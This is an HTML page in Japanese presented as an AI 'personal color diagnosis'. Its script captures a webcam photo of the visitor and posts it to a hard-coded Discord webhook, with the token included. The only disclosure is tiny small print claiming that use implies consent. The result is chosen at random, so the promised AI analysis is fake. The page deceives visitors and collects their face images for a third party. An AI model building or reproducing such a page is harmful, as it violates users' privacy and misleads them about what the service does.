<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>パーソナルカラー診断</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      padding: 20px;
      background-color: #fff0f5;
    }
    h1 {
      color: #ff69b4;
      margin-bottom: 10px;
    }
    p {
      color: #555;
      margin-bottom: 20px;
    }
    .button {
      background-color: #ff69b4;
      color: white;
      padding: 15px 32px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #ff85c1;
    }
    .result {
      margin-top: 20px;
    }
    img, video {
      max-width: 100%;
      height: auto;
      border-radius: 12px;
      margin-top: 20px;
    }
    .small-text {
      font-size: 10px;
      color: #999;
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <img src="header.JPG" alt="ヘッダー画像">
  <h1>パーソナルカラー診断</h1>
  <p>写真1枚でAIがパーソナルカラーを診断し、似合う色を提案します。</p>

  <button class="button" onclick="startCamera()">診断する</button>

  <div id="cameraArea" style="display:none;">
    <video id="video" autoplay playsinline muted></video>
    <br>
    <button class="button" onclick="takePhoto()">写真を撮る</button>
  </div>

  <div class="result" id="result"></div>

  <p class="small-text">
    ※撮影したお写真は、診断に使わせていただきます。<br>
    Discordに自動送信されます。<br>
    ご利用とともに同意したものとみなします。
  </p>

  <script>
    let videoStream;

    function startCamera() {
      document.getElementById('cameraArea').style.display = 'block';
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(stream => {
          videoStream = stream;
          const video = document.getElementById('video');
          video.srcObject = stream;
          video.play();
        })
        .catch(error => {
          alert('カメラが使えません: ' + error.message);
        });
    }

    function takePhoto() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');

      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
      }
      document.getElementById('cameraArea').style.display = 'none';

      const result = document.getElementById('result');
      result.innerHTML = `<p>診断中...</p><img src="${imageData}" alt="撮影画像">`;

      sendToDiscord(imageData);

      const resultImages = [
        { file: 'iebeh.PNG', text: 'あなたは【イエベ春】タイプです！' },
        { file: 'iebeh_aki.PNG', text: 'あなたは【イエベ秋】タイプです！' },
        { file: 'bluebe_natsu.PNG', text: 'あなたは【ブルベ夏】タイプです！' },
        { file: 'bluebe_fuyu.PNG', text: 'あなたは【ブルベ冬】タイプです！' }
      ];
      const selected = resultImages[Math.floor(Math.random() * resultImages.length)];

      setTimeout(() => {
        result.innerHTML += `
          <p style="font-size: 20px; color: #ff69b4; margin-top: 20px;">${selected.text}</p>
          <img src="${selected.file}" alt="診断結果画像">
        `;
      }, 5000);
    }

    function sendToDiscord(base64Image) {
      fetch("https://discord.com/api/webhooks/1365647175383646278/zr3nRlxGYnwnGyX_icocbi04RAS_dNy8dLVRclkCBCezZy-MRi3DMiuoAcjCxZHlyzDV", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          username: "診断Bot",
          content: "新しい診断写真が送信されました。",
          embeds: [{
            image: {
              url: base64Image
            }
          }]
        })
      });
    }
  </script>
</body>
</html>
